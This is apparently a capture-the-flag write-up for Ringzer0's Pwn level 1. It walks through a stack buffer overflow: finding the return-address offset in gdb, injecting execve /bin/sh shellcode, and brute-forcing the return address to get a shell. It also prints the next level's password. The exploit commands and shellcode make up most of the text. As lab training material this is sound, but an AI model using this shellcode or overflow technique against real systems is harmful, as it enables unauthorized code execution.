# Level 1 Ringzer0 Pwn challenges

Okay so from the C code, we can see that it is a really basic buffer overflow with no effort. Let's attempt it

## Proof of concept
We know the buffer is 1024 bytes but we need to know how many bytes are needed to overwrite the EIP. So let's get started with that.
```text
level1@lxc-pwn-x86:/levels$ gdb -q level1
Reading symbols from level1...done.
(gdb) r $(python -c 'print "A"*1032 + "BBBB"')
Starting program: /levels/level1 $(python -c 'print "A"*1032 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0xf7e34600 in __libc_start_main () from /lib32/libc.so.6

(gdb) r $(python -c 'print "A"*1036 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level1 $(python -c 'print "A"*1036 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

```

After some trial and error, we know that the payload size has to be 1036 bytes and then it has to follow up with the address of the buffer. 

## Completed Exploit
Now we need to find out the address of where our potential shellcode will be

For this, we set a breakpoint and then find the address where it is starting
```text
(gdb) r $(python -c 'print "A"*1036 + "BBBB"')
Starting program: /levels/level1 $(python -c 'print "A"*1036 + "BBBB"')

Breakpoint 1, main (argc=0, argv=0xffffd904) at level1.c:11
11      }
(gdb) print $esp
$1 = (void *) 0xffffd450

(gdb) x/wx 0xffffd450
0xffffd450:     0xffffd460

(gdb) x/wx 0xffffd460
0xffffd460:     0x41414141
```

Nice, we know that shellcode will start at address 0xffffd460. Let's set it as that, input our shellcode and get shell!
```text
(gdb) r $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*1012 + "\x60\xd4\xff\xff"')
Starting program: /levels/level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*1012 + "\x60\xd4\xff\xff"')
process 15230 is executing new program: /bin/sh
process 15230 is executing new program: /bin/bash
```
Yay! Let's try it outside GDB
```text
level1@lxc-pwn-x86:/levels$ ./level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*1012 + "\x60\xd4\xff\xff"')
Segmentation fault
```

Get rekt lmao

Okay then, after a lot of time searching on the internet, it most likely is the case where my address isn't hitting the shellcode outside GDB. because the address has changed. One solution to this is brute forcing it, and that's exactly what I did, because I honestly can't think of any other solution when GDB has let me down.

```text
level1@lxc-pwn-x86:/levels$ ./level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*1012 + "\x70\xd4\xff\xff"')
Segmentation fault

level1@lxc-pwn-x86:/levels$ ./level1 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*1012 + "\x80\xd4\xff\xff"')
level2@lxc-pwn-x86:/levels$ cat ~/.pass
TJyK9lJwZrgqc8nIIF6o
level2@lxc-pwn-x86:/levels$ exit
exit
```

Yay! We got shell bois, the return address was at a different address. Even though ASLR was off. Weird phenomenon and if anyone who's reading this knows, please do email me an answer I'm super interested to know why. 

The password to the next level is 
```text
TJyK9lJwZrgqc8nIIF6o
```

